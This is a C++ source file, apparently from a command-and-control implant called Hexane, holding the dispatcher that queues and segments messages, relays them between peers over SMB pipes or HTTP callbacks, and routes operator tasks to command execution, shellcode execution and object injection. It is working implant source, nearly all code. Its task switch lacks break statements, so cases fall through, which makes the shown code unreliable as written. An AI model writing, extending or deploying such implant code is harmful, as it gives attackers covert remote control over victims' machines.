#include <core/include/dispatch.hpp>
namespace Dispatcher {

    DWORD PeekPeerId(const _stream *const stream) {
        HEXANE

        uint32_t pid = 0;

        x_memcpy(&pid, B_PTR(stream->buffer) + 1, 4);
        return pid;
    }

    VOID AddMessage(_stream *const out) {
        HEXANE

        _stream *head = Ctx->transport.outbound_queue;

        if (!Ctx->transport.outbound_queue) {
            Ctx->transport.outbound_queue = out;
        } else {
            while (head->next) {
                head = head->next;
            }

            head->next = out;
        }
    }

    VOID RemoveMessage(const _stream *target) {
        HEXANE

        _stream *head = Ctx->transport.outbound_queue;
        _stream *prev = { };

        if (!head || !target) {
            return;
        }

        while (head) {
            if (head == target) {
                if (prev) {
                    prev->next = head->next;

                } else {
                    Ctx->transport.outbound_queue = head->next;
                }

                Stream::DestroyStream(head);
                return;

            }

            prev = head;
            head = head->next;
        }
    }

    VOID OutboundQueue(_stream *const out) {
        HEXANE

        _parser parser = { };
        _stream *queue = { };

        if (!out) {
            return_defer(ERROR_NO_DATA);
        }

        if (out->length > MESSAGE_MAX) {
            QueueSegments(B_PTR(out->buffer), out->length);

        } else {
            Parser::CreateParser(&parser, B_PTR(out->buffer), out->length);

            queue            = Stream::CreateStream();
            queue->peer_id   = __builtin_bswap32(S_CAST(ULONG, Parser::UnpackDword(&parser)));
            queue->task_id   = __builtin_bswap32(S_CAST(ULONG, Parser::UnpackDword(&parser)));
            queue->msg_type  = __builtin_bswap32(S_CAST(ULONG, Parser::UnpackDword(&parser)));

            queue->length   = parser.Length;
            queue->buffer   = B_PTR(x_realloc(queue->buffer, queue->length));

            x_memcpy(queue->buffer, parser.buffer, queue->length);
            AddMessage(queue);

            Parser::DestroyParser(&parser);
            Stream::DestroyStream(out);
        }

        defer:
    }

    VOID QueueSegments(uint8_t *const buffer, uint32_t length) {
        HEXANE

        _stream *queue = { };

        uint32_t offset     = 0;
        uint32_t peer_id    = 0;
        uint32_t task_id    = 0;
        uint32_t cb_seg     = 0;
        uint32_t index      = 1;

        const auto n_seg = (length + MESSAGE_MAX - 1) / MESSAGE_MAX;
        constexpr auto m_max = MESSAGE_MAX - SEGMENT_HEADER_SIZE;

        while (length > 0) {
            cb_seg  = length > m_max ? m_max : length;
            queue   = S_CAST(_stream*, x_malloc(cb_seg + SEGMENT_HEADER_SIZE));

            x_memcpy(&peer_id, buffer, 4);
            x_memcpy(&task_id, buffer + 4, 4);

            queue->peer_id    = peer_id;
            queue->task_id    = task_id;
            queue->msg_type   = TypeSegment;

            Stream::PackDword(queue, index);
            Stream::PackDword(queue, n_seg);
            Stream::PackDword(queue, cb_seg);
            Stream::PackBytes(queue, B_PTR(buffer) + offset, cb_seg);

            index++;
            length -= cb_seg;
            offset += cb_seg;

            AddMessage(queue);
        }
    }

    VOID PrepareEgressMessage(_stream *out) {
        HEXANE

        _parser parser  = { };
        for (auto head = Ctx->transport.outbound_queue; head; head = head->next) {
            if (B_PTR(head->buffer)[0] != 0) {
                continue;
            }

            Parser::CreateParser(&parser, B_PTR(head->buffer), head->length);
            Stream::PackDword(out, head->peer_id);
            Stream::PackDword(out, head->task_id);
            Stream::PackDword(out, head->msg_type);

            if (Ctx->root) {
                Stream::PackBytes(out, B_PTR(head->buffer), head->length);
            } else {
                Utils::AppendBuffer(&out->buffer, head->buffer, R_CAST(uint32_t*, &out->length), head->length);
            }

            break;
        }

        Parser::DestroyParser(&parser);
    }

    VOID PrepareIngressMessage(_stream *in){
        HEXANE

        if (in) {
            if (PeekPeerId(in) != Ctx->session.peer_id) {
                OutboundQueue(in);
            } else {
                CommandDispatch(in);
            }
        } else {
            auto head = Ctx->transport.outbound_queue;
            while (head) {
                head->ready = FALSE;
                head = head->next;
            }
        }
    }

    VOID MessageTransmit() {
        HEXANE

        _stream *out    = { };
        _stream *in     = { };

        retry:
        if (!Ctx->transport.outbound_queue) {

#ifdef TRANSPORT_SMB
            return_defer(ERROR_SUCCESS);
#else
            const auto entry = Stream::CreateStreamWithHeaders(TypeTasking);
            Dispatcher::OutboundQueue(entry);
            goto retry;
#endif
        }

        out = Stream::CreateStream();
        Dispatcher::PrepareEgressMessage(out);

#ifdef TRANSPORT_HTTP
        Network::Http::HttpCallback(out, &in);
#else
        Network::Smb::PipeSend(out);
        Network::Smb::PipeReceive(&in);
#endif
        Stream::DestroyStream(out);
        Dispatcher::PrepareIngressMessage(in);

        Clients::PushClients();
        defer:
    }

    VOID CommandDispatch (const _stream *const in) {
        HEXANE

        _parser parser = { };

        Parser::CreateParser(&parser, B_PTR(in->buffer), in->length);
        Parser::UnpackDword(&parser);

        Ctx->session.current_taskid = Parser::UnpackDword(&parser);
        switch (Parser::UnpackDword(&parser)) {

            case TypeCheckin:   Ctx->session.checkin = true;
            case TypeTasking:   Memory::Execute::ExecuteCommand(parser);
            case TypeExecute:   Memory::Execute::ExecuteShellcode(parser);
            case TypeObject:    Injection::LoadObject(parser);

            default:
                break;
        }

        Parser::DestroyParser(&parser);
    }
}
